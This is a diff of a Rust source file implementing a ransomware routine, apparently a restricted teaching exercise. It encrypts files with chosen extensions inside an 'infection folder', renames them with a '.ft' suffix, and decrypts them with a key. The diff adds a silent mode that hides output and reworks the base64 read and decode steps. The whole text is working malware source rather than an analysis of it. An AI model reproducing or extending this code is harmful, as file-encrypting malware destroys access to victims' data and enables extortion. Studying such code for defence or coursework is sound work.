@@ -1,9 +1,8 @@
-use std::result;
 
 use whoami;
 use base64::prelude::*;
 
-use crate::encrypt::{self, *};
+use crate::encrypt::*;
 
 fn is_file_extension_supported(file_extension: &String) -> bool {
     let file_extensions = [
@@ -96,7 +95,7 @@ fn get_extension(file: &std::path::PathBuf) -> String {
 fn safe_write_non_utf8(path: &std::path::PathBuf, content: &Vec<u8>) {
     let result = std::fs::write(&path, content);
     if let Err(e) = result {
-        println!("🔍 Error while writing the file: {:?}", e);
+        println!("⚠️{:?}: Error while writing: {:?}", path, e);
     }
 }
 
@@ -110,7 +109,7 @@ fn safe_write_non_utf8(path: &std::path::PathBuf, content: &Vec<u8>) {
 fn safe_write(path: &std::path::PathBuf, content: &str) {
     let result = std::fs::write(&path, content);
     if let Err(e) = result {
-        println!("🔍 Error while writing the file: {:?}", e);
+        println!("⚠️{:?}: Error while writing: {:?}", path, e);
     }
 }
 
@@ -122,22 +121,16 @@ fn safe_write(path: &std::path::PathBuf, content: &str) {
 /// Returns:
 /// - the content of the file
 fn safe_read(path: &std::path::PathBuf) -> String {
-    let result = std::fs::read_to_string(&path);
+    let result = std::fs::read(&path);
     let result = match result {
-        Ok(content) => content,
-                Err(e) => {
-                    let result = std::fs::read(&path);
-                    match result {
-                        Ok(content) => {
-                            let content = BASE64_STANDARD.encode(content);
-                            content
-                        }
-                        Err(e) => {
-                            println!("🔍 Error while reading the file: {:?}", e);
-                            String::new()
-                        }
-                    }
-                }
+        Ok(content) => {
+            let content = BASE64_STANDARD.encode(content);
+            content
+        },
+        Err(e) => {
+            println!("⚠️{:?}: Error while reading: {:?}", path, e);
+            String::new()
+        }
     };
     result
 }
@@ -147,11 +140,12 @@ fn safe_read(path: &std::path::PathBuf) -> String {
 /// - DirEntry: the file to encrypt
 /// Returns:
 /// - none
-fn encrypt_file(file: std::fs::DirEntry) {
+fn encrypt_file(file: std::fs::DirEntry, silent_mode: &bool) {
     let path = file.path();
     let extension = get_extension(&path);
     if is_file_extension_supported(&extension) {
         let content = safe_read(&path);
+
         if content.is_empty() {
             return;
         }
@@ -161,41 +155,70 @@ fn encrypt_file(file: std::fs::DirEntry) {
             let new_path = format!("{}.ft", path.to_str().unwrap());
             std::fs::rename(&path, new_path).unwrap();
         }
-        println!("🔒 File encrypted: {:?}", path);
+        if !silent_mode {
+            println!("🔒 {:?}", path);
+        }
     }
 }
 
-fn encrypt_files() {
+fn encrypt_files(silent_mode: &bool) {
     let files = get_files_in_infection_folder();
     match files {
         Ok(files) => {
             for file in files {
                 match file {
                     Ok(file) => {
-                        encrypt_file(file);
+                        encrypt_file(file, silent_mode);
                     }
                     Err(e) => {
-                        println!("🔍 Error while reading the file: {:?}", e);
+                        println!("⚠️ Error while reading: {:?}", e);
                     }
                 }
             }
         }
         Err(e) => {
-            println!("🔍 Error while reading the files: {:?}", e)
+            println!("⚠️ Error while reading the files: {:?}", e)
         }
     }
 }
 
-pub fn ransomware() {
+pub fn ransomware(silent_mode: &bool) {
     let infection_folder = check_infection_folder();
     if !infection_folder {
-        println!("🔍 No infection folder found");
-        println!("🔒 The program can only encrypt the files in the infection folder");
+        println!("⚠️ No infection folder found");
+        println!("The program can only encrypt the files in the infection folder");
         return;
     }
-    println!("🔍 Infection folder found");
-    println!("🔒 Encrypting files in the infection folder");
-    encrypt_files();
+    if !silent_mode {
+        println!("🔍 Infection folder found");
+        println!("🔑 Encrypting files in the infection folder");
+    }
+    encrypt_files(silent_mode);
+}
+
+/// Function that decode base64 String and returens the decoded content
+/// Arguments:
+/// - content: the content to decode String
+/// Returns:
+/// - the decoded content String
+fn decode_safe(content: &String) -> String {
+    let content = BASE64_STANDARD.decode(&content);
+    let content = match content {
+        Ok(content) => content,
+        Err(e) => {
+            println!("⚠️ Error while decoding the content: {:?}", e);
+            return String::new();
+        }
+    };
+    let content = String::from_utf8(content);
+    let content = match content {
+        Ok(content) => content,
+        Err(e) => {
+            println!("⚠️ Error while decoding the content: {:?}", e);
+            return String::new();
+        }
+    };
+    content
 }
 
 /// Function that decrypts one file
@@ -203,27 +226,33 @@ pub fn ransomware() {
 /// - DirEntry: the file to decrypt
 /// Returns:
 /// - none
-fn decrypt_file(file: std::fs::DirEntry) {
+fn decrypt_file(file: std::fs::DirEntry, key: &str, silent_mode: &bool) {
     let path = file.path();
     let extension = get_extension(&path);
     if extension == ".ft" {
         let content = safe_read(&path);
+        let content = decode_safe(&content);
         if content.is_empty() {
             return;
         }
-        let decrypted_content = decrypt_message(&content);
+        let decrypted_content = decrypt_message(&content, &key);
+        if decrypted_content.is_empty() {
+            return;
+        }
         let decrypted_content = BASE64_STANDARD.decode(&decrypted_content);
         let decrypted_content = match decrypted_content {
             Ok(content) => content,
             Err(e) => {
-                println!("🔍 Error while decoding the content: {:?}", e);
+                println!("⚠️{:?}: Error while decoding the content: {:?}", path, e);
                 return;
             }
         };
         safe_write_non_utf8(&path, &decrypted_content);
         let new_path = path.with_extension("");
         std::fs::rename(&path, new_path.clone()).unwrap();
-        println!("🔒 File decrypted: {:?}", &new_path);
+        if !silent_mode {
+            println!("🔓 {:?}", &new_path);
+        }
     }
 }
 
@@ -232,35 +261,37 @@ fn decrypt_file(file: std::fs::DirEntry) {
 /// - none
 /// Returns:
 /// - none
-fn decrypt_files() {
+fn decrypt_files(key: &str, silent_mode: &bool) {
     let files = get_files_in_infection_folder();
     match files {
         Ok(files) => {
             for file in files {
                 match file {
                     Ok(file) => {
-                        decrypt_file(file);
+                        decrypt_file(file, &key, silent_mode);
                     }
                     Err(e) => {
-                        println!("🔍 Error while reading the file: {:?}", e);
+                        println!("⚠️ Error while reading the file: {:?}", e);
                     }
                 }
             }
         }
         Err(e) => {
-            println!("🔍 Error while reading the files: {:?}", e)
+            println!("⚠️ Error while reading the files: {:?}", e)
         }
     }
 }
 
-pub fn ransomware_reverse(key: &str) {
+pub fn ransomware_reverse(key: &str, silent_mode: &bool) {
     let infection_folder = check_infection_folder();
     if !infection_folder {
-        println!("🔍 No infection folder found");
-        println!("🔒 The program can only decrypt the files in the infection folder");
+        println!("⚠️ No infection folder found");
+        println!("The program can only decrypt the files in the infection folder");
         return;
     }
-    println!("🔍 Infection folder found");
-    println!("🔒 Decrypting files in the infection folder");
-    decrypt_files();
+    if !silent_mode {
+        println!("🔍 Infection folder found");
+        println!("🔑 Decrypting files in the infection folder");
+    }
+    decrypt_files(key, silent_mode);
 }
